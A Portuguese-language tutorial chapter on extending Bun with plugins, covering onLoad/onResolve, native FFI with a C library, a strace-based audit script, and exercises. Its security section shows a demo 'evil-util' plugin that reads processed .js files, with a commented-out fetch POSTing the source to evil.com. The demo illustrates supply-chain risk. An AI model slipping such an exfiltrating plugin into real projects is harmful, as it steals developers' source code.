# Native Plugins — Extendendo Bun com Codigo Nativo

> Como escrever plugins nativos para Bun usando C, Zig, e Rust.

---

## Intuition (Feynman)

Plugins nativos sao como modulos de expansao: o Bun e o console de video game, e voce pode inserir cartuchos (plugins) que adicionam funcionalidades. Diferente de plugins JS (que rodam dentro do engine), plugins nativos sao codigo de maquina que o Bun chama diretamente — com todo o poder e riscos do codigo nativo.

---

## Source Code

No repositorio `oven-sh/bun`:
```
src/
├── bun.js/
│   ├── plugin.zig       # Plugin system
│   └── plugins/         # Plugins builtin
└── plugin.ts            # TypeScript API

# Documentacao:
# https://bun.sh/docs/bundler/plugins
```

---

## Hands-On Analysis

### 1. Plugin System do Bun

```typescript
// Plugins interceptam o processo de resolucao de modulos
import type { BunPlugin } from "bun";

const myPlugin: BunPlugin = {
    name: "my-plugin",

    setup(build) {
        // Interceptar imports que terminam em .yaml
        build.onLoad({ filter: /\.yaml$/ }, async (args) => {
            const text = await Bun.file(args.path).text();
            // Parsear YAML e retornar como modulo JS
            return {
                contents: `export default ${JSON.stringify(parseYaml(text))}`,
                loader: "js",
            };
        });

        // Interceptar resolucao de modulos
        build.onResolve({ filter: /^virtual:/ }, (args) => {
            return { path: args.path, namespace: "virtual" };
        });
    },
};

// Registrar o plugin
Bun.plugin(myPlugin);
```

### 2. Plugin com FFI Nativo

```typescript
// Plugin que chama codigo nativo via FFI
import { dlopen, FFIType, ptr } from "bun:ffi";
import type { BunPlugin } from "bun";

// Carregar biblioteca nativa
const lib = dlopen("./libparser.so", {
    parse_custom: {
        args: [FFIType.cstring, FFIType.u64],
        returns: FFIType.ptr,
    },
    free_result: {
        args: [FFIType.ptr],
        returns: FFIType.void,
    },
});

const nativePlugin: BunPlugin = {
    name: "native-parser",
    setup(build) {
        build.onLoad({ filter: /\.custom$/ }, async (args) => {
            const content = await Bun.file(args.path).bytes();
            const resultPtr = lib.symbols.parse_custom(
                ptr(content),
                BigInt(content.length)
            );
            // ... processar resultado
            return { contents: "...", loader: "js" };
        });
    },
};
```

### 3. Criar Biblioteca C para Plugin

```c
// libparser.c
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

typedef struct {
    char* result;
    size_t len;
} ParseResult;

// Funcao exportada para Bun FFI
ParseResult* parse_custom(const char* input, uint64_t len) {
    ParseResult* res = malloc(sizeof(ParseResult));
    // Processamento real aqui...
    res->result = strdup("{ \"parsed\": true }");
    res->len = strlen(res->result);
    return res;
}

void free_result(ParseResult* res) {
    if (res) {
        free(res->result);
        free(res);
    }
}
```

```bash
# Compilar
gcc -shared -fPIC -o libparser.so libparser.c
```

---

## Security Analysis

### Attack Surface de Plugins

```
Codigo JS/TS → Plugin API → FFI → Biblioteca Nativa → SO
```

Cada nivel amplia a superficie:

1. **Plugin carregado de node_modules**: supply chain attack
2. **Plugin chama FFI**: sem sandbox, acesso total
3. **Biblioteca nativa**: pode fazer qualquer coisa

```bash
# Inspecionar plugins carregados em runtime
# Nao ha API publica, mas pode monitorar dlopen
strace -e trace=openat,dlopen bun script.js 2>&1 | grep -E "\.so|plugin"
```

### Plugin Malicioso

```typescript
// DEMO: plugin "util" que faz exfiltration
import type { BunPlugin } from "bun";

const evilPlugin: BunPlugin = {
    name: "evil-util",
    setup(build) {
        build.onLoad({ filter: /\.js$/ }, async (args) => {
            // Le o arquivo que esta sendo processado
            const source = await Bun.file(args.path).text();

            // Exfiltra para servidor remoto (em plugin real malicioso)
            // await fetch("https://evil.com/collect", {
            //     method: "POST",
            //     body: source
            // });

            // Retorna o arquivo original sem modificar
            return { contents: source, loader: "js" };
        });
    },
};
```

---

## Exercises

### Ex F2.1 — YAML Plugin

```typescript
// Implemente um plugin que carrega arquivos .yaml
// Instale: bun add yaml

import type { BunPlugin } from "bun";
import { parse } from "yaml";

const yamlPlugin: BunPlugin = {
    name: "yaml-loader",
    setup(build) {
        build.onLoad({ filter: /\.(yml|yaml)$/ }, async (args) => {
            const text = await Bun.file(args.path).text();
            const data = parse(text);
            return {
                contents: `export default ${JSON.stringify(data)}`,
                loader: "js",
            };
        });
    },
};

Bun.plugin(yamlPlugin);

// Testar:
// import config from "./config.yaml";
```

### Ex F2.2 — Plugin de Ofuscacao

```typescript
// Plugin que ofusca strings no bundle para "proteger" codigo
import type { BunPlugin } from "bun";

const obfuscatePlugin: BunPlugin = {
    name: "string-obfuscator",
    setup(build) {
        build.onLoad({ filter: /\.ts$/ }, async (args) => {
            let source = await Bun.file(args.path).text();

            // Trocar strings literais por decode em runtime
            source = source.replace(
                /"([^"]{8,})"/g,
                (_, str) => {
                    const encoded = Buffer.from(str).toString("base64");
                    return `atob("${encoded}")`;
                }
            );

            return { contents: source, loader: "ts" };
        });
    },
};
```

### Ex F2.3 — Audit de Plugins

```bash
# Verificar quais .so sao carregados por uma aplicacao Bun
cat > /tmp/audit_plugins.sh << 'EOF'
#!/bin/bash
APP=${1:-"bun -e 'console.log(1)'"}

echo "Monitorando dlopen para: $APP"
strace -e trace=openat -f \
    bash -c "$APP" 2>&1 | \
    grep -E "\.so" | \
    grep -v "ENOENT" | \
    sort -u
EOF
bash /tmp/audit_plugins.sh "bun /tmp/any_script.js"
```

---

## Checkpoint

[ ] Entende a API de plugins do Bun (onLoad, onResolve)
[ ] Criou plugin que transforma arquivos
[ ] Entende como plugin pode usar FFI para codigo nativo
[ ] Sabe que plugins tem acesso completo sem sandbox
[ ] Auditou dlopen durante execucao de Bun

---

## Next

→ [`03-zig-bindings`](../03-zig-bindings/) — bindings Zig especificos do Bun
